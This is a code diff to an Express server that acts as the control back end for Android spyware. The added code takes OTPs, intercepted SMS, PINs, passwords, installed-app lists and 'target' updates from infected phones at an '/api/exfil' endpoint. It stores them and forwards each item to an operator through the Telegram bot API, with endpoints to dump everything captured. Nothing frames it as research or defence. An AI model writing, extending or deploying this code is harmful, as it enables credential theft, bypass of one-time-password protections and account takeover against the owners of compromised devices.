@@ -5,7 +5,10 @@ const crypto = require('crypto');
 const app = express();
 app.use(express.json());
 
+// Configuration
 const ADMIN_TOKEN = process.env.ADMIN_TOKEN || 'admin';
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
 
 // Store registered devices: { [deviceId]: { name, model, androidVersion, lastSeen, simNumbers, isDndOn, isMonitoring, connectedAt } }
 const registeredDevices = {
@@ -25,6 +28,101 @@ const registeredDevices = {
 
 // Store pending commands per device: { [deviceId]: [{ type, payload, timestamp }] }
 const queuedCommands = {};
+
+// Store captured data per device: { [deviceId]: [{ type, content, extra, timestamp }] }
+const capturedData = {};
+
+// Telegram API helper
+async function sendTelegramMessage(chatId, botToken, message) {
+  if (!botToken || !chatId) {
+    console.error('[Telegram] Bot token or chat ID not configured');
+    return { success: false, error: 'Bot token or chat ID not configured' };
+  }
+  
+  try {
+    const encodedMsg = encodeURIComponent(message);
+    const postData = `chat_id=${chatId}&text=${encodedMsg}&parse_mode=Markdown`;
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: postData
+    });
+    
+    const data = await response.json();
+    if (response.ok) {
+      console.log('[Telegram] Message sent successfully');
+      return { success: true, data };
+    } else {
+      console.error('[Telegram] Send failed:', data);
+      return { success: false, error: data.description || 'Unknown error' };
+    }
+  } catch (error) {
+    console.error('[Telegram] Error:', error);
+    return { success: false, error: error.message };
+  }
+}
+
+// Helper function to format Telegram messages
+function formatTelegramMessage(type, content, extra, device, timestamp) {
+  const deviceId = device.id || device.name;
+  const deviceName = `${device.name || deviceId} (${device.model || 'Unknown'})`;
+  
+  let title, formattedContent;
+  
+  switch (type) {
+    case 'otp':
+    case 'sms':
+    case 'sms_intercept':
+      title = '📱 OTP/SMS Capture';
+      formattedContent = `📋 Type: ${type}\n📝 Content: ${content}\n📱 Device: ${deviceName}\n🆔 Device ID: ${deviceId}\n⏱️ Time: ${timestamp}`;
+      break;
+    case 'pin':
+    case 'pin_capture':
+      title = '🔐 PIN Capture';
+      formattedContent = `🔐 *PIN Captured*\n📋 Type: ${type}\n PIN: ${content}\n📱 Device: ${deviceName}\n🆔 Device ID: ${deviceId}\n⏱️ Time: ${timestamp}`;
+      break;
+    case 'password_capture':
+      title = '🔑 Password Capture';
+      formattedContent = `🔑 *Password Captured*\n📋 Type: ${type}\nPassword: ${content}\n📱 Device: ${deviceName}\n🆔 Device ID: ${deviceId}\n⏱️ Time: ${timestamp}`;
+      break;
+    case 'installed_apps':
+      title = '📱 Installed Apps';
+      formattedContent = `📱 *Installed Apps*\n${content}\n📱 Device: ${deviceName}\n🆔 Device ID: ${deviceId}\n⏱️ Time: ${timestamp}`;
+      break;
+    case 'sim_number':
+    case 'device_register':
+      title = '📴 Device Registration';
+      formattedContent = `🔔 *New Device Connected*\n📋 Type: ${type}\nContent: ${content}\n📱 Device: ${deviceName}\n🆔 Device ID: ${deviceId}\n⏱️ Time: ${timestamp}`;
+      break;
+    case 'dnd_status':
+      title = '🔕 DND Status';
+      formattedContent = `🔕 *DND Status Update*\nContent: ${content}\nExtra: ${extra}\n📱 Device: ${deviceName}\n🆔 Device ID: ${deviceId}\n⏱️ Time: ${timestamp}`;
+      break;
+    case 'app_foreground':
+      title = '👁️ App Monitoring';
+      formattedContent = `👁️ *App Monitoring*\nContent: ${content}\nExtra: ${extra}\n📱 Device: ${deviceName}\n🆔 Device ID: ${deviceId}\n⏱️ Time: ${timestamp}`;
+      break;
+    case 'target_status':
+      title = '🎯 Target Update';
+      formattedContent = `🎯 *Target Update*\nContent: ${content}\nExtra: ${extra}\n📱 Device: ${deviceName}\n🆔 Device ID: ${deviceId}\n⏱️ Time: ${timestamp}`;
+      break;
+    case 'target_list':
+      title = '📋 Current Targets';
+      formattedContent = `📋 *Current Targets*\n${content}\n📱 Device: ${deviceName}\n🆔 Device ID: ${deviceId}\n⏱️ Time: ${timestamp}`;
+      break;
+    case 'anti_revocation':
+      title = '🛡️ Anti-Revocation';
+      formattedContent = `🛡️ *Anti-Revocation Alert*\nContent: ${content}\nExtra: ${extra}\n📱 Device: ${deviceName}\n🆔 Device ID: ${deviceId}\n⏱️ Time: ${timestamp}`;
+      break;
+    default:
+      title = '🎯 Data Capture';
+      formattedContent = `🎯 *Data Capture*\nType: ${type}\nContent: ${content}\nExtra: ${extra || ''}\n📱 Device: ${deviceName}\n🆔 Device ID: ${deviceId}\n⏱️ Time: ${timestamp}`;
+  }
+  
+  return `${title}\n\n${formattedContent}`;
+}
 
 // Generate a unique device ID
 function generateDeviceId() {
@@ -142,6 +240,8 @@ app.get('/api/status', (req, res) => {
       online: onlineCount,
       offline: offlineCount
     },
+    botConfigured: !!TELEGRAM_BOT_TOKEN,
+    chatConfigured: !!TELEGRAM_CHAT_ID,
     timestamp: new Date().toISOString()
   });
 });
@@ -149,6 +249,68 @@ app.get('/api/status', (req, res) => {
 // Health check endpoint
 app.get('/health', (req, res) => {
   res.json({ status: 'healthy', timestamp: Date.now() });
+});
+
+// API: Receive captured data from Decry app (alternative to Telegram direct send)
+app.post('/api/exfil/:deviceId', (req, res) => {
+  const { deviceId } = req.params;
+  const { type, content, extra } = req.body;
+  
+  if (!type || !content) {
+    return res.status(400).json({ error: 'type and content are required' });
+  }
+  
+  // Store captured data
+  if (!capturedData[deviceId]) capturedData[deviceId] = [];
+  capturedData[deviceId].push({
+    type,
+    content,
+    extra: extra || '',
+    timestamp: Date.now()
+  });
+  
+  // Format message for Telegram
+  const device = registeredDevices[deviceId] || { id: deviceId, name: 'Unknown', model: 'Unknown', androidVersion: 'Unknown' };
+  const timestamp = new Date().toISOString().replace('T', ' ').substring(0, 19);
+  
+  const message = formatTelegramMessage(type, content, extra, device, timestamp);
+  
+  // Send to Telegram asynchronously
+  sendTelegramMessage(TELEGRAM_CHAT_ID, TELEGRAM_BOT_TOKEN, message)
+    .then(result => {
+      if (result.success) {
+        Log(`✅ Data exfiltrated for ${deviceId}: ${type}`);
+      } else {
+        Log(`⚠️ Telegram send failed for ${deviceId}: ${result.error}`);
+        // Data still stored locally in capturedData
+      }
+    });
+  
+  res.json({ 
+    success: true, 
+    message: 'Data received and queued for exfiltration',
+    stored: true 
+  });
+});
+
+// API: Get captured data for a device
+app.get('/api/data/:deviceId', (req, res) => {
+  const { deviceId } = req.params;
+  const limit = parseInt(req.query.limit) || 100;
+  
+  const data = capturedData[deviceId] || [];
+  const limited = data.slice(-limit).reverse();
+  
+  res.json({ deviceId, count: data.length, data: limited });
+});
+
+// API: Get all captured data
+app.get('/api/data', (req, res) => {
+  const result = {};
+  for (const [deviceId, data] of Object.entries(capturedData)) {
+    result[deviceId] = data.slice(-50).reverse();
+  }
+  res.json(result);
 });
 
 // API: Send target app command
